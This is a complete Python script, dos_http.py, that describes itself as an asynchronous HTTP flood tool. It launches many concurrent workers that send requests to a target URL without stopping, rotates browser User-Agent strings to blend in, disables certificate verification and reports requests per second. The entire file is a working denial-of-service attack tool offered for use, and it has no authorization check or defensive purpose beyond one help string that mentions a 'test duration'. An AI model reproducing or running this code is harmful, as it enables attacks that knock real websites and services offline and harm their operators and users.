# language: Python 3, file: dos_http.py, target: Windows/Linux
# Asynchronous HTTP/1.1 & HTTP/2 Flood tool with User-Agent rotation and rate tracking.

import asyncio
import argparse
import random
import time
import sys
from typing import List

USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

REQUEST_COUNT = 0
STOP_EVENT = asyncio.Event()

async def flood_worker(url: str, use_http2: bool, timeout: float):
    global REQUEST_COUNT
    import httpx
    
    headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*"}
    client_kwargs = {"http2": use_http2, "verify": False, "timeout": timeout}
    
    async with httpx.AsyncClient(**client_kwargs) as client:
        while not STOP_EVENT.is_set():
            try:
                resp = await client.get(url, headers={"User-Agent": random.choice(USER_AGENTS)})
                if resp.status_code < 500:
                    REQUEST_COUNT += 1
            except Exception:
                await asyncio.sleep(0.01)

async def monitor(duration: int):
    start = time.time()
    last_count = 0
    while not STOP_EVENT.is_set():
        await asyncio.sleep(1)
        elapsed = time.time() - start
        curr_count = REQUEST_COUNT
        rps = curr_count - last_count
        last_count = curr_count
        print(f"\r[+] Requests sent: {curr_count} | RPS: {rps}/s | Time: {int(elapsed)}s", end="", flush=True)
        if duration > 0 and elapsed >= duration:
            STOP_EVENT.set()
            break

async def main_async(target: str, workers: int, duration: int, http2: bool, timeout: float):
    print(f"[*] Starting HTTP Flood -> {target}")
    print(f"[*] Workers: {workers} | HTTP/2: {http2} | Duration: {duration if duration > 0 else 'Infinite'}")
    
    monitor_task = asyncio.create_task(monitor(duration))
    worker_tasks = [asyncio.create_task(flood_worker(target, http2, timeout)) for _ in range(workers)]
    
    try:
        await monitor_task
    except KeyboardInterrupt:
        print("\n[!] Stopping workers...")
        STOP_EVENT.set()
        
    await asyncio.gather(*worker_tasks, return_exceptions=True)
    print(f"\n[+] Total requests sent: {REQUEST_COUNT}")

def main():
    parser = argparse.ArgumentParser(description="Async HTTP Flood Tool")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://example.com)")
    parser.add_argument("-w", "--workers", type=int, default=100, help="Number of concurrent worker tasks")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Test duration in seconds (0 = run until Ctrl+C)")
    parser.add_argument("--http2", action="store_true", help="Enable HTTP/2 protocol support")
    parser.add_argument("--timeout", type=float, default=5.0, help="Request timeout")
    
    args = parser.parse_args()
    
    try:
        import httpx
    except ImportError:
        print("[!] Missing required dependency 'httpx'. Install via: pip install httpx[http2]")
        sys.exit(1)
        
    try:
        asyncio.run(main_async(args.target, args.workers, args.duration, args.http2, args.timeout))
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
